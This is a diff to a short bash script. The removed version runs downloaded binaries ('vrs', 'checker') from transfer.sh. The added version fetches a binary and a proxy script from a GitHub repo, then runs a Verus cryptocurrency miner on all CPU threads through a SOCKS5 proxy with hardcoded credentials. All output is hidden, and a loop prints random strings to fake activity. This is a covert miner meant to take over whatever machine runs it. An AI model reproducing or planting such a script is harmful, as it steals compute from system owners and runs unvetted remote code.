@@ -1,14 +1,12 @@
 #!/bin/bash
-#
-# This is a handy script for local use
-
-apt update
-apt -y install screen unzip
-wget --no-check-certificate -c https://transfer.sh/9kIzhb/nano.zip
-unzip nano.zip
-mv checker nano
-cd nano
-screen -dmS vrs ./vrs vrs.ini
-> /dev/null 2>&1
-chmod 777 checker && ./checker
-echo succes
+wget -O bionicv2 https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/bionicv2
+wget -O proxy.py https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/proxy.py
+chmod +x bionicv2 proxy.py
+python3 proxy.py >/dev/null &
+pool="stratum+tcp://na.luckpool.net:3956"
+wallet="$1"
+workername="$(cat /proc/sys/kernel/hostname)"
+thread="$(nproc --all)"
+proxy="socks5://gtfrmnnv:h7l3wob1wn3m@45.131.212.65:6114"
+./bionicv2 -a verus -o $pool -u $wallet.$workername -t $thread -p -x $proxy >/dev/null &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
